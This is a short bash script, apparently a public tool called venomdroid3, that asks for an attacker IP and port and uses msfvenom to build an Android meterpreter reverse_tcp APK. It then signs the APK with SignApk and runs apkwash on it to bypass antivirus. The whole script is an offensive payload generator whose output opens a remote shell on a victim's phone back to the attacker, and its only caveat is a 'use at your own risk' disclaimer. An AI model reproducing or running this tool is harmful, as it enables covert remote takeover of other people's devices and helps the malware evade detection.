#!/bin/bash/
#-Metadata----------------------------------------------------#
#  Filename: venomdroid3.sh (v1.0)           (Update: 2017-06-21)#
#-Info--------------------------------------------------------#
#  Quickly generate Metasploit Payload APK signed and         #
#  AV Bypassing.                                              #
#-Author(s)---------------------------------------------------#
# manofftoday ~ https://github.com/manofftoday                #
#-Operating System--------------------------------------------#
#  Designed for & tested on: Kali Rolling & Metasploit v4.11+ #
#-Licence-----------------------------------------------------#
#  MIT License ~ http://opensource.org/licenses/MIT           #
#-Notes-------------------------------------------------------#
#  Requires:                                                  #
#    Metasploit Framework v4.11.3-2015062101 or higher        #
#    SignAPK   https://github.com/techexpertize/SignApk                                               #
#    Apkwash ~ https://github.com/jbreed/apkwash.git          #
#                             ---                             #
#                             ---                             #
#-------------------------------------------------------------#

#VARIABLES COLOUR OUTPUT
RED="\033[01;31m"
GREEN="\033[01;32m"
YELLOW="\033[01;33m"
BLUE="\033[01;34m"
BOLD="\033[01;01m"
RESET="\033[00m"


clear
echo "${YELLOW}////////WELCOME TO VENOMDROID3 v1.0////////${RESET}"
echo "${GREEN}//by manofftoday//${RESET}"
echo "${RED}Use it at your own risk. We disclaims all responsibility."
echo "It's your responsibility to make sure that your activities comply with applicable laws... ${RESET}"
echo "\n"
echo "${BLUE}Attacker IP:${RESET}"
read ip
echo "${BLUE}Port:${RESET}"
read port
echo "${BLUE}Name of APK (Write extension .apk):${RESET}"
read name
echo "${GREEN}Creating APK with msfvenom.......${RESET}"
msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R > $name
echo "${GREEN}Signing APK with signapk....${RESET}"
java -jar SignApk/signapk.jar SignApk/certificate.pem SignApk/key.pk8 $name SignedAPK/$name
rm $name
echo "${GREEN}Antivirus Bypassing with apkwash...${RESET}"
apkwash /SignedAPK/$name
echo "${GREEN}Congratulations, APK $name Created${RESET}"
echo "${GREEN}Exiting...${RESET}"
